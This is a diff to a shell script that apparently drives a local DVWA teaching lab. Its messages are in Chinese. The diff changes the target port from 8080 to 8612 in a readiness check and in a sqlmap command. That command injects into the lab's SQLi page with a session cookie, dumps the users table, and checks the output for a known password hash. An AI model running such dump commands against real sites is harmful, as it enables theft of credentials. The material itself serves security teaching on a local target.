@@ -21,7 +21,7 @@ do_apply() {
     "$PY" -c "import requests" 2>/dev/null || die "缺少 requests：pip3 install requests"
     [ -d "$DVWA_DIR" ] || die "找不到实验 12 目录（${DVWA_DIR}）"
     "$DVWA_DIR/dvwa.sh" apply | tail -3
-    curl -s -o /dev/null -w '' "http://127.0.0.1:8080/login.php" \
+    curl -s -o /dev/null -w '' "http://127.0.0.1:8612/login.php" \
         || die "DVWA 未就绪"
     ok "靶场就绪（后续所有注入都打在这个本地靶站上）"
 }
@@ -56,7 +56,7 @@ do_observe() {
         local cookie
         cookie="$("$PY" sqli_lab.py session)"
         rm -rf "$ART/sqlmap"
-        sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+        sqlmap -u "http://127.0.0.1:8612/vulnerabilities/sqli/?id=1&Submit=Submit" \
             --cookie="$cookie" --batch --flush-session -T users --dump \
             --output-dir="$ART/sqlmap" > "$ART/sqlmap.out" 2>&1 || true
         grep -q "5f4dcc3b5aa765d61d8327deb882cf99" "$ART/sqlmap.out" \
